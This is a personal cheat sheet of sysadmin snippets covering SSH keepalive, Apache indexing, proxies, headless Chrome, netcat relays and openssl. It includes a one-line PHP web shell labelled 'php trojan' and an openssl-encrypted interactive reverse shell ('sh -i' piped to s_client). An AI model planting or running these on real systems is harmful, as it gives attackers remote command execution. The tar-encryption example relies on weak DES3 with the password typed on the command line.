# fswatch
`go install github.com/codeskyblue/fswatch`


# httpd
* [http://httpd.apache.org/docs/trunk/mod/mod_autoindex.html#indexoptions](http://httpd.apache.org/docs/trunk/mod/mod_autoindex.html#indexoptions)

```
Options Indexes FollowSymLinks
IndexOptions FoldersFirst HTMLTable NameWidth=* VersionSort
```


# php trojan
```
($_=@$_GET[2]).@$_($_POST[1])
```


# ssh connection alive
## server
```
TCPKeepAlive yes #表示TCP保持连接不断开
ClientAliveInterval 300 #指定服务端向客户端请求消息的时间间隔，单位是秒，默认是0，不发送。
ClientAliveCountMax 3 #指服务端发出请求后客户端无响应则自动断开的最大次数。使用默认给的3即可。
```
### 注意：TCPKeepAlive必须打开，否则直接影响后面的设置。ClientAliveInterval设置的值要小于各层防火墙的最小值，不然，也就没用了。最后要重启sshd服务才生效
## client
```
Host * #表示需要启用该规则的服务端（域名或ip）
	ServerAliveInterval 60 #表示没60秒去给服务端发起一次请求消息（这个设置好就行了）
	ServerAliveCountMax 3 #表示最大连续尝试连接次数（这个基本不用设置）
```
## one time
`ssh -o ServerAliveInterval=30 user@host`


# secure tar
```
tar czf - package | openssl des3 -salt -k youPassword -out tar.tar.gz
# dd if=tar.tar.gz | openssl tar -d -k youPassword |tar zxf -
openssl des3 -d -salt -k youPassword -in tar.tar.gz | tar xzf -
```


# bash proxy
```
export https_proxy=10.0.0.52:8080
export https_proxy=user:pass@192.158.8.8:8080
export https_proxy=socks://10.0.0.52:1080
export https_proxy=socks4://10.0.0.52:1080
export https_proxy=socks5://10.0.0.52:1080
export ftp_proxy=socks5://10.0.0.52:1080
export no_proxy="*.aiezu.com,10.*.*.*,192.168.*.*,*.local,localhost,127.0.0.1"
```


# dig
`dig txt b.aliyuntest.com @8.8.8.8`

# shell beep
`echo -ne '\007'` or `echo -e "\a"` or `echo -n Ctrl+V Ctrl+G`

# gorpc
`protoc -I server/proto/ server/proto/geo.proto --go_out=plugins=grpc:server/proto`

# headless chrome
```
chrome --headless --disable-gpu --print-to-pdf https://www.baidu.com
chrome --headless --disable-gpu --dump-dom https://www.baidu.com
chrome --headless --disable-gpu --screenshot --window-size=1280,1696 https://www.baidu.com
```

# quick ssl
`go run $GOROOT/src/crypto/tls/generate_cert.go --host m.treevc.net`

# nc + pipe
```
nc -4kl 2222 <pipe | nc 127.0.0.1 3000 >pipe
```

# openssl s_server and s_client
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 2333
sh -i < pipe 2>&1 | openssl s_client -quiet -connect 127.0.0.1:2333 > pipe
```
